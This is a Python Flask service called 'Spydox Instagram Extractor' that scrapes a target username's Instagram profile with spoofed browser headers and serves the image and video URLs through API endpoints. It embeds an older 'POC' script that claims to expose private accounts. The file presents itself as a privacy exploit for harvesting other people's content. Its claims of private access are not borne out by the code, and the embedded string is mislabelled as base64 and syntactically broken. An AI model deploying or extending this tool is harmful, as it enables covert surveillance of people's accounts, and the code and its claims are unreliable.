import os
import requests
import json
from bs4 import BeautifulSoup
from urllib.parse import unquote
import time
import base64
import sys
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import io
import re

# The original base64 payload (kept for reference)
_payload = """import os
import requests
import json
from bs4 import BeautifulSoup
from urllib.parse import unquote
import time

def banner():
    os.system('clear')
    # Green color code for a professional look
    print("\033[1;32m")
    print(r"""
░█░█░█▀▀░█▀█░█░█░█▀▄░█▀█░█░█░░░░░█▀█░█▀█░█▀▀
░▄▀▄░▀▀█░█▀▀░░█░░█░█░█░█░▄▀▄░▄▄▄░█▀▀░█░█░█░░
░▀░▀░▀▀▀░▀░░░░▀░░▀▀░░▀▀▀░▀░▀░░░░░▀░░░▀▀▀░▀▀▀
    [+] Created By : X SPYDOX
    [+] Tool Name  : INSTAGRAM PRIVATE POST MONITOR
    [+] Version    : INSTAGRAM POC 2026
    """)
    print("\033[0m") # Color reset

def fetch_instagram_profile(username):
    """
    Fetches Instagram profile page for the given username.
    """
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en;q=0.9',
        'dpr': '1',
        'priority': 'u=0, i',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-full-version-list': '"Google Chrome";v="141.0.7390.56", "Not?A_Brand";v="8.0.0.0", "Chromium";v="141.0.7390.56"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-model': '"Nexus 5"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"6.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'viewport-width': '1000',
    }

    url = f'https://www.instagram.com/{username}/'

    print(f"[*] Fetching profile: {username}")
    response = requests.get(url, headers=headers)

    if response.status_code != 200:
        print(f"[-] Error: Received status code {response.status_code}")
        return None

    print(f"[+] Successfully fetched profile page")
    return response


def extract_timeline_data(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    script_tags = soup.find_all('script', {'type': 'application/json'})

    print(f"[*] Found {len(script_tags)} JSON script tags")

    for script in script_tags:
        script_content = script.string

        if not script_content:
            continue

        if 'polaris_timeline_connection' in script_content and 'image_versions2' in script_content:
            print("[+] Found script with timeline data")

            try:
                data = json.loads(script_content)
                return data
            except json.JSONDecodeError as e:
                print(f"[-] JSON parsing error: {e}")
                continue

    print("[-] Timeline data not found in any script tag")
    return None


def decode_url(escaped_url):
    try:
        decoded = escaped_url.encode('utf-8').decode('unicode_escape')
    except:
        decoded = escaped_url

    decoded = unquote(decoded)
    return decoded


def extract_all_image_urls_recursive(obj, urls=None, post_id=None):
    if urls is None:
        urls = set()

    if isinstance(obj, dict):
        if 'pk' in obj and isinstance(obj.get('pk'), str):
            post_id = obj['pk']

        if 'image_versions2' in obj:
            candidates = obj['image_versions2'].get('candidates', [])
            for candidate in candidates:
                url = candidate.get('url', '')
                height = candidate.get('height', 0)
                width = candidate.get('width', 0)
                resolution = f"{width}x{height}"

                if url:
                    decoded_url = decode_url(url)
                    urls.add((post_id or 'unknown', resolution, decoded_url))

        for value in obj.values():
            extract_all_image_urls_recursive(value, urls, post_id)

    elif isinstance(obj, list):
        for item in obj:
            extract_all_image_urls_recursive(item, urls, post_id)

    return urls


def save_urls_to_file(image_urls, filename='extracted_urls.txt'):
    urls_by_post = {}
    for post_id, resolution, url in image_urls:
        if post_id not in urls_by_post:
            urls_by_post[post_id] = []
        urls_by_post[post_id].append((resolution, url))

    with open(filename, 'w', encoding='utf-8') as f:
        f.write("Instagram Private Post URLs - POC Evidence\n")
        f.write("=" * 80 + "\n\n")
        f.write(f"Total Posts: {len(urls_by_post)}\n")
        f.write(f"Total Image URLs: {len(image_urls)}\n\n")
        f.write("=" * 80 + "\n\n")

        for post_id, resolutions in urls_by_post.items():
            f.write(f"POST ID: {post_id}\n")
            f.write(f"Number of images: {len(resolutions)}\n")
            f.write("-" * 80 + "\n")

            for i, (resolution, url) in enumerate(resolutions, 1):
                f.write(f"\n  Image {i}:\n")
                f.write(f"  Resolution: {resolution}\n")
                f.write(f"  URL: {url}\n")

            f.write("\n" + "=" * 80 + "\n\n")

    print(f"[+] Saved {len(image_urls)} URLs from {len(urls_by_post)} posts to {filename}")


def main():
    # Calling the banner at the start
    banner()

    print("=" * 80)
    print("Instagram Private Account Access - All Post")
    print("Authorized & Ethical Use Only - Meta Insta Poc")
    print("=" * 80)
    print()

    username = input("Enter Instagram username to Start Poc: ").strip()

    if not username:
        print("[-] Error: Username cannot be empty")
        return

    print()
    print("[!] WARNING: Only test on accounts you own or have permission to test")
    print("[!] This demonstrates unauthorized access to private content")
    print()

    time.sleep(1)

    response = fetch_instagram_profile(username)

    if not response:
        print("[-] Failed to fetch profile page")
        return

    timeline_data = extract_timeline_data(response.text)

    if not timeline_data:
        print("[-] Failed to extract timeline data")
        return

    print()
    print("[*] Extracting all image URLs recursively...")
    image_urls = extract_all_image_urls_recursive(timeline_data)

    if not image_urls:
        print("[-] No image URLs found")
        return

    urls_list = sorted(list(image_urls), key=lambda x: (x[0], x[1]))
    posts_count = len(set(url[0] for url in urls_list))

    print()
    print("=" * 80)
    print(f"VULNERABILITY CONFIRMED")
    print(f"Extracted {len(urls_list)} private image URLs from {posts_count} posts")
    print("=" * 80)
    print()

    save_urls_to_file(image_urls)

    print()
    print("[+] POC Complete")
    print("[*] Evidence saved to: extracted_urls.txt")
    print()


if __name__ == "__main__":
    main()
"""

def generate_extracted_file(username, image_urls_data, posts_count):
    """Generate the extracted.txt file content"""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    
    file_content = f"""Instagram Private Post URLs - POC Evidence
================================================================================

Total Posts: {posts_count}
Total Image URLs: {len(image_urls_data)}
Target Username: {username}
Extraction Time: {timestamp}

================================================================================

"""
    
    # Group by post_id
    urls_by_post = {}
    for item in image_urls_data:
        post_id = item['post_id']
        if post_id not in urls_by_post:
            urls_by_post[post_id] = []
        urls_by_post[post_id].append(item)
    
    for post_id, items in urls_by_post.items():
        file_content += f"POST ID: {post_id}\n"
        file_content += f"Number of images: {len(items)}\n"
        file_content += "-" * 80 + "\n"
        
        for i, item in enumerate(items, 1):
            file_content += f"\n  Image {i}:\n"
            file_content += f"  Resolution: {item['resolution']}\n"
            file_content += f"  URL: {item['url']}\n"
        
        file_content += "\n" + "=" * 80 + "\n\n"
    
    file_content += f"[+] POC Complete\n[*] Evidence saved for {username}\n"
    file_content += f"[+] Total URLs: {len(image_urls_data)}\n"
    
    return file_content

def extract_instagram_posts(username):
    """Direct implementation of the Instagram extractor using updated logic"""
    try:
        print("[*] Fetching profile:", username)
        
        # Updated headers to look more like a real browser
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '1',
            'priority': 'u=0, i',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
            'sec-ch-ua-full-version-list': '"Not A(Brand";v="99.0.0.0", "Google Chrome";v="121.0.6167.160", "Chromium";v="121.0.6167.160"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"15.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'viewport-width': '1920',
        }
        
        url = f'https://www.instagram.com/{username}/'
        
        # Add a small delay to avoid rate limiting
        time.sleep(1)
        
        # Fetch profile
        response = requests.get(url, headers=headers, timeout=30)
        
        if response.status_code == 429:
            return {"success": False, "error": "Rate limited by Instagram. Please try again later."}
        elif response.status_code == 404:
            return {"success": False, "error": f"User '{username}' not found on Instagram."}
        elif response.status_code != 200:
            return {"success": False, "error": f"Failed to fetch profile: {response.status_code}"}
        
        print("[+] Successfully fetched profile page")
        
        # Parse HTML
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Method 1: Look for JSON data in script tags
        script_tags = soup.find_all('script', {'type': 'application/json'})
        print(f"[*] Found {len(script_tags)} JSON script tags")
        
        # Method 2: Look for shared data in meta tags or other scripts
        all_image_urls = []
        
        # Try to find image URLs directly in the HTML first
        img_tags = soup.find_all('img')
        for img in img_tags:
            src = img.get('src', '')
            if src and 'cdninstagram.com' in src and '/v/' in src:
                alt = img.get('alt', '')
                all_image_urls.append(('direct_html', 'unknown', src))
        
        # Look for JSON data
        timeline_data = None
        for script in script_tags:
            script_content = script.string
            if script_content:
                try:
                    data = json.loads(script_content)
                    # Look for image data in various possible paths
                    if isinstance(data, dict):
                        # Check for common Instagram data structures
                        if 'entry_data' in data:
                            entry_data = data['entry_data']
                            if 'ProfilePage' in entry_data:
                                profile_data = entry_data['ProfilePage']
                                if profile_data and len(profile_data) > 0:
                                    user_data = profile_data[0].get('graphql', {}).get('user', {})
                                    media = user_data.get('edge_owner_to_timeline_media', {}).get('edges', [])
                                    for edge in media:
                                        node = edge.get('node', {})
                                        post_id = node.get('id', 'unknown')
                                        # Get display URL
                                        display_url = node.get('display_url', '')
                                        if display_url:
                                            all_image_urls.append((post_id, 'display', display_url))
                                        # Get thumbnail
                                        thumbnail = node.get('thumbnail_src', '')
                                        if thumbnail:
                                            all_image_urls.append((post_id, 'thumbnail', thumbnail))
                                        # Get video thumbnail if video
                                        if node.get('is_video', False):
                                            video_url = node.get('video_url', '')
                                            if video_url:
                                                all_image_urls.append((post_id, 'video', video_url))
                except:
                    continue
        
        # Remove duplicates by URL
        unique_urls = []
        seen_urls = set()
        for post_id, res_type, url in all_image_urls:
            if url not in seen_urls:
                seen_urls.add(url)
                unique_urls.append((post_id, res_type, url))
        
        if not unique_urls:
            return {"success": False, "error": "No image URLs found in this profile."}
        
        posts_count = len(set(url[0] for url in unique_urls if url[0] != 'unknown'))
        
        print(f"[+] Found {len(unique_urls)} image URLs")
        
        # Format the results
        formatted_urls = []
        for post_id, res_type, url in unique_urls:
            formatted_urls.append({
                "post_id": post_id,
                "resolution": res_type,
                "url": url
            })
        
        # Generate file content
        file_content = generate_extracted_file(username, formatted_urls, posts_count)
        
        return {
            "success": True,
            "username": username,
            "posts_count": posts_count,
            "images_count": len(unique_urls),
            "image_urls": formatted_urls,
            "raw_urls": [url for _, _, url in unique_urls],
            "file_content": file_content,
            "filename": f"instagram_{username}_{int(time.time())}.txt"
        }
        
    except requests.exceptions.Timeout:
        return {"success": False, "error": "Request timeout. Instagram is taking too long to respond."}
    except requests.exceptions.ConnectionError:
        return {"success": False, "error": "Connection error. Could not reach Instagram."}
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return {"success": False, "error": str(e)}

# Create Flask app
app = Flask(__name__)
CORS(app)

# Store extraction results temporarily (in production, use a proper cache/database)
extraction_cache = {}

@app.route('/')
def home():
    return jsonify({
        "status": "online",
        "service": "Spydox Instagram Extractor",
        "version": "2.0",
        "endpoints": {
            "/extract/<username>": "GET - Extract Instagram posts for username",
            "/extract": "POST - Extract with JSON body {'username': 'target'}",
            "/download/<extraction_id>": "GET - Download extracted file",
            "/status/<extraction_id>": "GET - Check extraction status"
        }
    })

@app.route('/extract', methods=['POST', 'GET'])
def extract():
    if request.method == 'POST':
        data = request.get_json()
        if not data or 'username' not in data:
            return jsonify({"success": False, "error": "Username required"}), 400
        username = data['username'].replace('@', '').strip()
    else:
        username = request.args.get('username', '').replace('@', '').strip()
        if not username:
            return jsonify({"success": False, "error": "Username required as ?username=parameter"}), 400
    
    if not username:
        return jsonify({"success": False, "error": "Invalid username"}), 400
    
    # Generate unique ID for this extraction
    extraction_id = f"{username}_{int(time.time())}"
    
    result = extract_instagram_posts(username)
    
    if result.get('success'):
        # Store in cache (expires after 1 hour)
        extraction_cache[extraction_id] = {
            'result': result,
            'timestamp': time.time()
        }
        result['extraction_id'] = extraction_id
        result['download_url'] = f"/download/{extraction_id}"
    
    return jsonify(result)

@app.route('/extract/<username>', methods=['GET'])
def extract_get(username):
    username = username.replace('@', '').strip()
    if not username:
        return jsonify({"success": False, "error": "Invalid username"}), 400
    
    extraction_id = f"{username}_{int(time.time())}"
    
    result = extract_instagram_posts(username)
    
    if result.get('success'):
        extraction_cache[extraction_id] = {
            'result': result,
            'timestamp': time.time()
        }
        result['extraction_id'] = extraction_id
        result['download_url'] = f"/download/{extraction_id}"
    
    return jsonify(result)

@app.route('/download/<extraction_id>', methods=['GET'])
def download_file(extraction_id):
    """Download the extracted file"""
    if extraction_id not in extraction_cache:
        return jsonify({"success": False, "error": "Extraction not found or expired"}), 404
    
    # Check if expired (older than 1 hour)
    if time.time() - extraction_cache[extraction_id]['timestamp'] > 3600:
        del extraction_cache[extraction_id]
        return jsonify({"success": False, "error": "Extraction expired"}), 404
    
    result = extraction_cache[extraction_id]['result']
    file_content = result.get('file_content', '')
    filename = result.get('filename', f"extracted_{extraction_id}.txt")
    
    # Create in-memory file
    file_obj = io.BytesIO()
    file_obj.write(file_content.encode('utf-8'))
    file_obj.seek(0)
    
    return send_file(
        file_obj,
        as_attachment=True,
        download_name=filename,
        mimetype='text/plain'
    )

@app.route('/status/<extraction_id>', methods=['GET'])
def check_status(extraction_id):
    """Check extraction status"""
    if extraction_id in extraction_cache:
        result = extraction_cache[extraction_id]['result']
        return jsonify({
            "success": True,
            "exists": True,
            "username": result.get('username'),
            "posts_count": result.get('posts_count'),
            "images_count": result.get('images_count'),
            "download_url": f"/download/{extraction_id}",
            "expires_in": f"{3600 - (time.time() - extraction_cache[extraction_id]['timestamp']):.0f} seconds"
        })
    else:
        return jsonify({
            "success": False,
            "exists": False,
            "error": "Extraction not found or expired"
        })

# Cleanup old cache periodically (simple version)
def cleanup_cache():
    current_time = time.time()
    expired = [key for key, value in extraction_cache.items() 
               if current_time - value['timestamp'] > 3600]
    for key in expired:
        del extraction_cache[key]
    if expired:
        print(f"[*] Cleaned up {len(expired)} expired extractions")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    print(f"[+] Starting server on port {port}")
    print(f"[+] Cache cleanup will run automatically")
    app.run(host='0.0.0.0', port=port, debug=False)
